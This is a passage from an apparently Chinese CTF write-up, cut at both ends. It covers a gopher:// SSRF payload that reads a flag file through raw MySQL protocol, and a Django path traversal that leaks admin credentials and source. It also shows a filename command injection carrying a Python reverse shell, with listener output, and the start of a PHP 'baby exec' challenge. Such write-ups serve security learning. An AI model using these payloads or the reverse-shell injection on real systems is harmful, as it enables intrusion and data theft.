</span></span></code></pre></div><p>得到 payload </p><p><code>gopher://127.0.0.1:3306/A%A4%00%00%01%85%A2%3F%00%00%00%00%01%21%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00root%00%00mysql_native_password%00g%03_os%05Linux%0C_client_name%08libmysql%04_pid%0520924%0F_client_version%0710.1.37%09_platform%06x86_64%0Cprogram_name%05mysql2%00%00%00%03SELECT%20load_file%28%27/var/lib/mysql-files/flag.txt%27%29%01%00%00%00%01</code></p><p>然后你会得到&mldr; </p><p><img src=https://i.loli.net/2019/03/08/5c826ef30a8bd.png#center alt referrerpolicy=no-referrer></p><p>太真实了, 再 fuzz 一下, 发现过滤了 file 和 - 字符, 直接 urlencode 一下就可以 bypass, 得到新的 payload </p><p><code>gopher://127.0.0.1:3306/A%A4%00%00%01%85%A2%3F%00%00%00%00%01%21%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00root%00%00mysql_native_password%00g%03_os%05Linux%0C_client_name%08libmysql%04_pid%0520924%0F_client_version%0710.1.37%09_platform%06x86_64%0Cprogram_name%05mysql2%00%00%00%03SELECT%20load_%66ile%28%27/var/lib/mysql%2dfiles/flag.txt%27%29%01%00%00%00%01</code></p><p><img src=https://i.loli.net/2019/03/08/5c826f0a88582.png#center alt referrerpolicy=no-referrer></p><p>得到 flag{gopher_make_mysql_happy}</p><h3 id=0x05-eeeee>0x05 eeeee</h3><p>考察点: Django目录穿越,命令执行bypass</p><p>入口点: http://212.64.89.186/booksystem/static/<br>访问之后是500,在后面输入内容显示文件不存在, 所以这里可以判断出是存在文件读取的：<br>http://212.64.89.186/booksystem/static/..%2f..%2fpass.txt<br>后台逻辑为:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1</span><span><span style=color:#ff79c6>def</span> <span style=color:#50fa7b>do_GET</span>(request,filename):
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2</span><span>    full_path <span style=color:#ff79c6>=</span> os<span style=color:#ff79c6>.</span>path<span style=color:#ff79c6>.</span>join(<span style=color:#f1fa8c>&#39;static&#39;</span>, filename)
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3</span><span>    <span style=color:#6272a4>#print(full_path)</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4</span><span>    <span style=color:#ff79c6>if</span> <span style=color:#ff79c6>not</span> os<span style=color:#ff79c6>.</span>path<span style=color:#ff79c6>.</span>exists(full_path):
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5</span><span>        <span style=color:#ff79c6>return</span> HttpResponseNotFound(<span style=color:#f1fa8c>&#39;&lt;h1&gt;file not found&lt;h1&gt;&#39;</span>)
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6</span><span>    <span style=color:#ff79c6>else</span>:
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7</span><span>        <span style=color:#ff79c6>if</span>(filename[<span style=color:#ff79c6>-</span><span style=color:#bd93f9>3</span>:]<span style=color:#ff79c6>==</span><span style=color:#f1fa8c>&#34;css&#34;</span>):
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8</span><span>            response <span style=color:#ff79c6>=</span> HttpResponse(read_file(full_path))
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9</span><span>            response[<span style=color:#f1fa8c>&#39;Content-Type&#39;</span>] <span style=color:#ff79c6>=</span> <span style=color:#f1fa8c>&#39;text/css&#39;</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">10</span><span>            response[<span style=color:#f1fa8c>&#39;Content-Length&#39;</span>] <span style=color:#ff79c6>=</span> os<span style=color:#ff79c6>.</span>path<span style=color:#ff79c6>.</span>getsize(full_path)
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">11</span><span>            <span style=color:#6272a4>#response[&#39;Content-Disposition&#39;] = &#39;attachment; filename=%s&#39; % filename</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">12</span><span>            response[<span style=color:#f1fa8c>&#39;Accept-Ranges&#39;</span>] <span style=color:#ff79c6>=</span> <span style=color:#f1fa8c>&#39;bytes&#39;</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">13</span><span>            <span style=color:#ff79c6>return</span> response
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">14</span><span>        <span style=color:#ff79c6>elif</span>(filename[<span style=color:#ff79c6>-</span><span style=color:#bd93f9>3</span>:]<span style=color:#ff79c6>==</span><span style=color:#f1fa8c>&#34;svg&#34;</span>):
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">15</span><span>            response <span style=color:#ff79c6>=</span> HttpResponse(read_file(full_path))
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">16</span><span>            response[<span style=color:#f1fa8c>&#39;Content-Type&#39;</span>] <span style=color:#ff79c6>=</span> <span style=color:#f1fa8c>&#39;image/svg+xml&#39;</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">17</span><span>            response[<span style=color:#f1fa8c>&#39;Content-Length&#39;</span>] <span style=color:#ff79c6>=</span> os<span style=color:#ff79c6>.</span>path<span style=color:#ff79c6>.</span>getsize(full_path)
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">18</span><span>            <span style=color:#6272a4>#response[&#39;Content-Disposition&#39;] = &#39;attachment; filename=%s&#39; % filename</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">19</span><span>            response[<span style=color:#f1fa8c>&#39;Accept-Ranges&#39;</span>] <span style=color:#ff79c6>=</span> <span style=color:#f1fa8c>&#39;bytes&#39;</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">20</span><span>            <span style=color:#ff79c6>return</span> response
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">21</span><span>        <span style=color:#ff79c6>else</span>:
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">22</span><span>            response <span style=color:#ff79c6>=</span> HttpResponse(read_file(full_path))
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">23</span><span>            response[<span style=color:#f1fa8c>&#39;Content-Type&#39;</span>] <span style=color:#ff79c6>=</span> <span style=color:#f1fa8c>&#39;text/html&#39;</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">24</span><span>            response[<span style=color:#f1fa8c>&#39;Content-Length&#39;</span>] <span style=color:#ff79c6>=</span> os<span style=color:#ff79c6>.</span>path<span style=color:#ff79c6>.</span>getsize(full_path)
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">25</span><span>            <span style=color:#6272a4>#response[&#39;Content-Disposition&#39;] = &#39;attachment; filename=%s&#39; % filename</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">26</span><span>            response[<span style=color:#f1fa8c>&#39;Accept-Ranges&#39;</span>] <span style=color:#ff79c6>=</span> <span style=color:#f1fa8c>&#39;bytes&#39;</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">27</span><span>            <span style=color:#ff79c6>return</span> response   
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">28</span><span><span style=color:#ff79c6>def</span> <span style=color:#50fa7b>read_file</span>(filename):
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">29</span><span>    <span style=color:#ff79c6>try</span>:
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">30</span><span>        <span style=color:#ff79c6>with</span> <span style=color:#8be9fd;font-style:italic>open</span>(filename, <span style=color:#f1fa8c>&#39;rb&#39;</span>) <span style=color:#ff79c6>as</span> f:
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">31</span><span>            content <span style=color:#ff79c6>=</span> f<span style=color:#ff79c6>.</span>read()
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">32</span><span>            <span style=color:#ff79c6>yield</span> content
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">33</span><span>        f<span style=color:#ff79c6>.</span>close()
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">34</span><span>    <span style=color:#ff79c6>except</span> Exception <span style=color:#ff79c6>as</span> e:
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">35</span><span>        <span style=color:#8be9fd;font-style:italic>print</span>(e<span style=color:#ff79c6>.</span>message)
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">36</span><span>        <span style=color:#8be9fd;font-style:italic>print</span>(<span style=color:#f1fa8c>&#39;read error&#39;</span>)
</span></span></code></pre></div><p>可以读取到admin的用户名和密码,然后进行登录: admin:this_is_admin_password</p><p>使用admin登录之后可以看到上传文件的地方,因为是python写的, 所以不太确定能不能上传webshell, 然后使用之前的任意文件读取读源码, 看实现逻辑:<br>http://212.64.89.186/booksystem/static/..%2fbooksystem/views.py<br>实现逻辑:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1</span><span><span style=color:#ff79c6>def</span> <span style=color:#50fa7b>Do_upload</span>(request): <span style=color:#6272a4>#文件上传, 格式转换</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2</span><span>    black_list <span style=color:#ff79c6>=</span> [<span style=color:#f1fa8c>&#39;`&#39;</span>,<span style=color:#f1fa8c>&#39;;&#39;</span>,<span style=color:#f1fa8c>&#39;&amp;&#39;</span>,<span style=color:#f1fa8c>&#39;|&#39;</span>,<span style=color:#f1fa8c>&#34;PS&#34;</span>,<span style=color:#f1fa8c>&#39;&gt;&#39;</span>,<span style=color:#f1fa8c>&#34;&lt;&#34;</span>]
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3</span><span>    <span style=color:#6272a4>#return HttpResponse(os.path)</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4</span><span>    <span style=color:#ff79c6>if</span> request<span style=color:#ff79c6>.</span>method <span style=color:#ff79c6>==</span> <span style=color:#f1fa8c>&#39;POST&#39;</span>:
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5</span><span>        ret <span style=color:#ff79c6>=</span> {<span style=color:#f1fa8c>&#39;status&#39;</span>: <span style=color:#ff79c6>False</span>, <span style=color:#f1fa8c>&#39;data&#39;</span>: <span style=color:#ff79c6>None</span>, <span style=color:#f1fa8c>&#39;error&#39;</span>: <span style=color:#ff79c6>None</span>}
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6</span><span>        user <span style=color:#ff79c6>=</span> request<span style=color:#ff79c6>.</span>POST<span style=color:#ff79c6>.</span>get(<span style=color:#f1fa8c>&#39;user&#39;</span>)
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7</span><span>        img <span style=color:#ff79c6>=</span> request<span style=color:#ff79c6>.</span>FILES<span style=color:#ff79c6>.</span>get(<span style=color:#f1fa8c>&#39;img&#39;</span>)
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8</span><span>        <span style=color:#ff79c6>for</span> i <span style=color:#ff79c6>in</span> black_list:
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9</span><span>            <span style=color:#ff79c6>if</span> i <span style=color:#ff79c6>in</span> img<span style=color:#ff79c6>.</span>name:
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">10</span><span>                <span style=color:#ff79c6>return</span> HttpResponse(<span style=color:#f1fa8c>&#34;你是魔鬼吗？&#34;</span>)
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">11</span><span>        f <span style=color:#ff79c6>=</span> <span style=color:#8be9fd;font-style:italic>open</span>(os<span style=color:#ff79c6>.</span>path<span style=color:#ff79c6>.</span>join(<span style=color:#f1fa8c>&#39;upfile&#39;</span>, img<span style=color:#ff79c6>.</span>name), <span style=color:#f1fa8c>&#39;wb&#39;</span>)
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">12</span><span>        <span style=color:#6272a4>#return HttpResponse(os.path)</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">13</span><span>        <span style=color:#ff79c6>for</span> chunk <span style=color:#ff79c6>in</span> img<span style=color:#ff79c6>.</span>chunks(chunk_size<span style=color:#ff79c6>=</span><span style=color:#bd93f9>1024</span>):
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">14</span><span>            <span style=color:#ff79c6>if</span> <span style=color:#f1fa8c>b</span><span style=color:#f1fa8c>&#34;%!PS&#34;</span> <span style=color:#ff79c6>in</span> chunk:
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">15</span><span>                 <span style=color:#ff79c6>return</span> HttpResponse(<span style=color:#f1fa8c>&#34;你是个大魔鬼！&#34;</span>)
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">16</span><span>            f<span style=color:#ff79c6>.</span>write(chunk)
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">17</span><span>        f<span style=color:#ff79c6>.</span>close()
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">18</span><span>        ret[<span style=color:#f1fa8c>&#39;status&#39;</span>] <span style=color:#ff79c6>=</span> <span style=color:#ff79c6>True</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">19</span><span>        ret[<span style=color:#f1fa8c>&#39;data&#39;</span>] <span style=color:#ff79c6>=</span> os<span style=color:#ff79c6>.</span>path<span style=color:#ff79c6>.</span>join(<span style=color:#f1fa8c>&#39;upfile&#39;</span>, <span style=color:#f1fa8c>&#39;smaller_&#39;</span><span style=color:#ff79c6>+</span>img<span style=color:#ff79c6>.</span>name)
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">20</span><span>        command <span style=color:#ff79c6>=</span> <span style=color:#f1fa8c>&#34;convert -resize 200x100 \`pwd\`/upfile/&#34;</span><span style=color:#ff79c6>+</span>img<span style=color:#ff79c6>.</span>name<span style=color:#ff79c6>+</span><span style=color:#f1fa8c>&#34;  \`pwd\`/upfile/smaller_&#34;</span><span style=color:#ff79c6>+</span>img<span style=color:#ff79c6>.</span>name<span style=color:#ff79c6>+</span><span style=color:#f1fa8c>&#34;;rm \`pwd\`/upfile/&#34;</span><span style=color:#ff79c6>+</span>img<span style=color:#ff79c6>.</span>name
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">21</span><span>        <span style=color:#6272a4>#os.system(&#34;echo &#34;+command+&#34;&gt; /tmp/123&#34;)</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">22</span><span>        os<span style=color:#ff79c6>.</span>system(command)
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">23</span><span>        <span style=color:#ff79c6>return</span> HttpResponse(json<span style=color:#ff79c6>.</span>dumps(ret))
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">24</span><span>        <span style=color:#6272a4># except Exception as e:</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">25</span><span>        <span style=color:#6272a4>#     ret[&#39;error&#39;] = e</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">26</span><span>        <span style=color:#6272a4># finally:</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">27</span><span>        <span style=color:#6272a4>#     f.close()</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">28</span><span>        <span style=color:#6272a4>#     return HttpResponse(json.dumps(ret))</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">29</span><span>    <span style=color:#ff79c6>else</span>:
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">30</span><span>        <span style=color:#ff79c6>return</span> HttpResponse(<span style=color:#f1fa8c>&#39;&#39;</span>)
</span></span></code></pre></div><p>本意是利用imagemagic的洞getshell的, 但是我太懒了, 没有换服务器里面的版本, 所以就只能用文件名导致的命令注入了, 这里有个坑, nginx会把 &ldquo;/&rdquo; 后面的作为文件名解析, 所以需要绕过 &ldquo;/&rdquo;, exp:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1</span><span><span style=color:#ff79c6>import</span> requests
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">2</span><span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">3</span><span>files <span style=color:#ff79c6>=</span> {
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">4</span><span>    <span style=color:#f1fa8c>&#34;img&#34;</span>: (<span style=color:#f1fa8c>&#34;asd</span><span style=color:#f1fa8c>\n</span><span style=color:#f1fa8c>python -c </span><span style=color:#f1fa8c>\&#34;</span><span style=color:#f1fa8c>import socket,subprocess,os</span><span style=color:#f1fa8c>\n</span><span style=color:#f1fa8c>s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><span style=color:#f1fa8c>\n</span><span style=color:#f1fa8c>s.connect((&#39;Your_ip&#39;,19132))</span><span style=color:#f1fa8c>\n</span><span style=color:#f1fa8c>os.dup2(s.fileno(),0)</span><span style=color:#f1fa8c>\n</span><span style=color:#f1fa8c>os.dup2(s.fileno(),1)</span><span style=color:#f1fa8c>\n</span><span style=color:#f1fa8c>os.dup2(s.fileno(),2)</span><span style=color:#f1fa8c>\n</span><span style=color:#f1fa8c>p=subprocess.call([chr(47)+&#39;bin&#39;+chr(47)+&#39;sh&#39;,&#39;-i&#39;])</span><span style=color:#f1fa8c>\&#34;</span><span style=color:#f1fa8c>&#34;</span>, <span style=color:#f1fa8c>&#34;asd&#34;</span>)
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">5</span><span>}
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">6</span><span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">7</span><span>res <span style=color:#ff79c6>=</span> requests<span style=color:#ff79c6>.</span>post(<span style=color:#f1fa8c>&#34;http://212.64.89.186/upload/&#34;</span>, files<span style=color:#ff79c6>=</span>files)
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">8</span><span><span style=color:#8be9fd;font-style:italic>print</span>(res<span style=color:#ff79c6>.</span>text)
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1</span><span>$ nc -lvvp 19132
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2</span><span>Listening on [0.0.0.0] (family 0, port 19132)
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3</span><span>Connection from 212.64.89.186 38538 received!
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4</span><span>/bin/sh: 0: can&#39;t access tty; job control turned off
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5</span><span>$ ls
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6</span><span>FlightTicket
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7</span><span>a.txt
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8</span><span>aaab.txt
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9</span><span>article.db
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">10</span><span>booksystem
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">11</span><span>flightdb.sqlite3
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">12</span><span>index.html
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">13</span><span>index.html.1
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">14</span><span>index.html.2
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">15</span><span>manage.py
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">16</span><span>nohup.out
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">17</span><span>pass.txt
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">18</span><span>requirements.txt
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">19</span><span>static
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">20</span><span>templates
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">21</span><span>testdb.py
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">22</span><span>upfile
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">23</span><span>$ cat ~/Flaaa44444AAAAAAGGGGGG
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">24</span><span>flag{Django_is_Very_Interesting}
</span></span></code></pre></div><h3 id=0x06-baby-exec>0x06 baby exec</h3><p>代码如下:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1</span><span><span style=color:#ff79c6>&lt;?</span>php
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2</span><span>ini_set(<span style=color:#f1fa8c>&#34;display_errors&#34;</span>, <span style=color:#bd93f9>0</span>);
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3</span><span>error_reporting(<span style=color:#ff79c6>E_ALL</span> <span style=color:#ff79c6>^</span> E_NOTICE);
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4</span><span>error_reporting(<span style=color:#ff79c6>E_ALL</span> <span style=color:#ff79c6>^</span> <span style=color:#ff79c6>E_WARNING</span>);
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5</span><span><span style=color:#ff79c6>include</span>(<span style=color:#f1fa8c>&#39;config.php&#39;</span>);
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6</span><span><span style=color:#8be9fd;font-style:italic>$v1</span> <span style=color:#ff79c6>=</span> [<span style=color:#f1fa8c>&#39;admin&#39;</span>,<span style=color:#f1fa8c>&#39;test&#39;</span>];
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7</span><span><span style=color:#8be9fd;font-style:italic>$v2</span> <span style=color:#ff79c6>=</span> <span style=color:#8be9fd;font-style:italic>$_POST</span>[<span style=color:#f1fa8c>&#39;v2&#39;</span>];
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8</span><span><span style=color:#8be9fd;font-style:italic>$number</span> <span style=color:#ff79c6>=</span> <span style=color:#bd93f9>1</span>;
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9</span><span><span style=color:#8be9fd;font-style:italic>$v5</span><span style=color:#ff79c6>=</span><span style=color:#bd93f9>0</span>;
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">10</span><span><span style=color:#ff79c6>if</span>(<span style=color:#8be9fd;font-style:italic>$v2</span> <span style=color:#ff79c6>===</span> <span style=color:#8be9fd;font-style:italic>$v1</span> <span style=color:#ff79c6>&amp;</span> <span style=color:#8be9fd;font-style:italic>$v2</span>[<span style=color:#bd93f9>0</span>] <span style=color:#ff79c6>!=</span> <span style=color:#f1fa8c>&#39;admin&#39;</span>){<span style=color:#6272a4>//There you can execute the command
</span></span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">11</span><span><span style=color:#6272a4></span>    
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">12</span><span>    <span style=color:#8be9fd;font-style:italic>$v3</span> <span style=color:#ff79c6>=</span> <span style=color:#8be9fd;font-style:italic>$_GET</span>[<span style=color:#f1fa8c>&#39;v3&#39;</span>];
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">13</span><span>    <span style=color:#8be9fd;font-style:italic>$v4</span> <span style=color:#ff79c6>=</span> <span style=color:#8be9fd;font-style:italic>$_GET</span>;
